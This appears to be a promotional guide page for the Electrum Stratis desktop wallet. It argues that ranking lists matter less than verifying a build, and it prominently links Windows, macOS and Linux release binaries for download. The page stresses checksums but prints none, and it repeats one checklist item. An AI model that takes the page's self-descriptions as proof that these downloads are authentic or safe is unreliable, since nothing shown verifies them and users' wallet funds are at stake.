![Electrum-Stratis](assets/banner-article.png)

# Why "trusted wallet" lists cannot tell you what you need to know

<p align="center">Verification beats a ranking</p>

<p align="center"><a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe"><img alt="Download for Windows" src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-089ae8?style=for-the-badge&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg"><img alt="Download for macOS" src="https://img.shields.io/badge/DOWNLOAD-MACOS-089ae8?style=for-the-badge&labelColor=071727&logo=apple&logoColor=ffffff"></a> <a href="https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip"><img alt="Download for Linux" src="https://img.shields.io/badge/DOWNLOAD-LINUX-089ae8?style=for-the-badge&labelColor=071727&logo=linux&logoColor=ffffff"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img alt="Windows" height="24" src="https://img.shields.io/badge/os-windows-089ae8?style=flat-square&labelColor=071727&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA4OCA4OCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMTIuNCAzNS43IDcuNXYzNC4zSDB6TTQwIDYuOSA4OCAwdjQxLjhINDB6TTAgNDYuMmgzNS43djM0LjRMMCA3NS42ek00MCA0Ni4yaDQ4Vjg4bC00OC02Ljl6Ii8%2BPC9zdmc%2B&logoColor=ffffff"> | Windows 10 (1909) or later, 64-bit | [`electrum-stratis-v2.7.19.exe`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.exe) |
| <img alt="macOS" height="24" src="https://img.shields.io/badge/os-macos-089ae8?style=flat-square&labelColor=071727&logo=apple&logoColor=ffffff"> | macOS 12 or later | [`electrum-stratis-v2.7.19.dmg`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.dmg) |
| <img alt="Linux" height="24" src="https://img.shields.io/badge/os-linux-089ae8?style=flat-square&labelColor=071727&logo=linux&logoColor=ffffff"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-stratis-v2.7.19.zip`](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/download/v2.7.19/electrum-stratis-v2.7.19.zip) |

</div>

All versions, installers and checksums are on the [Electrum-Stratis v2.7.19 release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

> Only download from this GitHub release page.

Trust in a self-custody wallet is not a rating, it is a property you verify: where the build came from, whether its checksum matches, whether the code is public and maintained. A list that ranks wallets by reputation can tell you what other people think; it cannot tell you what a specific binary on your disk will do. Electrum Stratis is a self-custody desktop wallet for the legacy Stratis chain, and every claim it makes about itself is checkable.

## You'll see this if

<div align="center">

| What the list offers | What it cannot know | What to check instead |
|---|---|---|
| A numbered ranking | Which build you downloaded | The published checksum |
| A "most trusted" badge | Whether your copy matches it | The commit hash in the app |
| A safety score | Who packaged your installer | The release page you used |
| A user-review average | Whether the reviewer ran the code | The public source |
| An "official" label | Whether the label is real | Non-affiliation statements |

</div>

The question behind the search is usually "can I lose my coins by using this?" - and that question is answered by provenance and key handling, not by a position in a table.

## Why it happens

Lists are written about categories, and self-custody software is not a category with a central authority. There is no certifying body for desktop wallets, no equivalent of a bank licence, and no way for a reviewer to attest to a build they did not compile. What exists is evidence: a repository, a released binary, a hash, a signature, a changelog.

That is why the strongest statements in this space are narrow. "The code is public" is verifiable. "The release is signed" is verifiable. "This is the most trusted wallet" is not a statement about software at all; it is a statement about a survey.

What the build reports - version, build date, commit hash, advisory status - is the only evidence here you can check without trusting anyone, and the current release is on the [release page](https://github.com/electrum-stratis-project/electrum-stratis-wallet/releases/tag/v2.7.19).

## Fix

1. **Replace the ranking with a checklist.** Public source, published checksum, a release page you can reach from the project itself, an app that reports the commit it was built from. Four items, all checkable in minutes.
2. **Verify the file you downloaded.** Compare the SHA-256 with the published value before running it. A build that cannot be verified is a build you are trusting on faith, which is the opposite of what a trust list is supposed to provide ([Electrum Stratis maintenance and releases](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/is-the-wallet-still-maintained.md)).
3. **Read what the project says it is.** A project that names its own maintainers, its release page and the codebase it descends from is giving you facts you can check; a page that only lists features is not.
4. **Judge maintenance by artefacts, not by sentiment.** A published build with a date and a hash is evidence; a forum thread is opinion.
5. **Ask what the wallet cannot do.** A wallet that states its boundary - no STRAX, no accounts, no price feed, no recovery service - is describing itself accurately, and accuracy is the trait that matters when the alternative is a promise.

None of this makes a list useless as a starting point for names. It makes it useless as the last word on safety, which is what it is usually taken to be.

## If that did not work

If two sources disagree about which build is current, the release page settles it. It is the only place a version, a date and an asset list appear together.

If a list recommends a wallet you cannot verify, the recommendation is not actionable. Unverifiable advice is not neutral; it transfers risk to you without giving you anything to check.

If you already installed something from a list and cannot tell what it is, compare the app's reported commit with the published one. A build that reports nothing, or reports something that does not match, is not the build the project published.

## Prevention

- Keep a short verification checklist and use it for every wallet, not just this one.
- Download only from a release page you reached from the project itself.
- Compare the checksum every time, even for an update.
- Distrust "official" and "most trusted" as labels; they are claims about people, not code.
- Prefer a wallet that states its limits to one that promises everything.
- Keep a four-item verification checklist and use it on every wallet, not only this one.

## FAQ

### What is the most trusted crypto wallet?

The framing does not survive contact with how wallets work: trust in self-custody software is verification, not reputation. The workable answer is a wallet whose source is public, whose build you can verify, and whose stated limits match what it does.

### Are desktop wallets safe for holding Stratis?

A desktop wallet is as safe as its provenance and the machine it runs on. Verified build, offline seed, strong file password, clean system - those four decide the outcome far more than the interface does.

### Which is the most secure digital wallet?

The one you can verify and whose keys never leave your control. A hardware device adds a physical boundary; a desktop wallet adds convenience. Neither is "most secure" in the abstract, and a ranking that claims otherwise is measuring something else.

### Should I trust a wallet because a list says it is audited?

"Audited" without a named auditor, a scope and a public report is a marketing word. Ask which code was reviewed, by whom, and where the report is. If those answers do not exist, treat the claim as decoration.

<!-- DOWNLOAD-BLOCK -->

A list is a claim about the past, compiled by someone you cannot audit, about software that changes. The useful question is not who recommends a wallet but what you can verify yourself: the release page, the hash, the licence, the code. A list can point you at a candidate; it cannot certify one. Treat every entry, including a favourable one, as a lead rather than a verdict.

## Related articles

- [Is Electrum Stratis safe to use?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/how-safe-is-the-desktop-wallet.md)
- [Where to download the current build](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/where-to-get-the-current-build.md)
- [Which version is current, and is mine real?](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/which-release-is-current.md)
- [The 2018 seed flaw: what it was](https://github.com/electrum-stratis-project/electrum-stratis-guides/blob/main/the-2018-seed-flaw.md)
